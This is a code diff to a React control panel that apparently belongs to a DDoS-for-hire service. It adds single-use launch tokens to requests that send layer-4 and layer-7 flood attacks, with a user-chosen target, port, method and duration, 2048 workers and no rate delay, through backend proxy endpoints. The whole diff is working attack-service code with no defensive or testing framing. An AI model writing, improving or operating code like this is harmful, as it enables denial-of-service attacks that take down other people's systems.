@@ -249,13 +249,33 @@ export default function Panel() {
     const authToken = session?.access_token ?? "";
     const proxyHeaders = { "Content-Type": "application/json", Authorization: `Bearer ${authToken}` };
 
+    // Fetch a single-use token — this binds the request to this browser session.
+    // A token copied from DevTools is dead after first use.
+    dbg("info", "Requesting single-use launch token…");
+    let launchToken;
+    try {
+      const tokenRes = await fetch("/proxy/launch-token", {
+        headers: { Authorization: `Bearer ${authToken}` },
+      });
+      const tokenJson = await tokenRes.json();
+      if (!tokenRes.ok) throw new Error(tokenJson?.error ?? `HTTP ${tokenRes.status}`);
+      launchToken = tokenJson.token;
+      dbg("info", "Launch token obtained");
+    } catch (err) {
+      dbg("error", `Failed to obtain launch token: ${err.message}`);
+      setLaunchError("Could not start: " + err.message);
+      await supabase.from(table).update({ status: "failed", stopped_at: new Date().toISOString() }).eq("id", insertedRun.id);
+      setLaunching(false);
+      return;
+    }
+
     if (layer === "L4") {
       dbg("info", `Dispatching L4 attack (${method}) via proxy…`);
       try {
         const r = await fetch("/proxy/l4/start", {
           method:  "POST",
           headers: proxyHeaders,
-          body:    JSON.stringify({ target: target.trim(), port, method, duration }),
+          body:    JSON.stringify({ target: target.trim(), port, method, duration, launch_token: launchToken }),
         });
         const json = await r.json();
         if (!r.ok) throw new Error(json?.error ?? `HTTP ${r.status}`);
@@ -283,11 +303,12 @@ export default function Panel() {
           method:  "POST",
           headers: proxyHeaders,
           body:    JSON.stringify({
-            target:     target.trim(),
-            method:     method.toLowerCase().replace(/-/g, ""),
+            target:       target.trim(),
+            method:       method.toLowerCase().replace(/-/g, ""),
             duration,
-            workers:    2048,
-            rate_delay: 0,
+            workers:      2048,
+            rate_delay:   0,
+            launch_token: launchToken,
           }),
         });
         const json = await r.json();
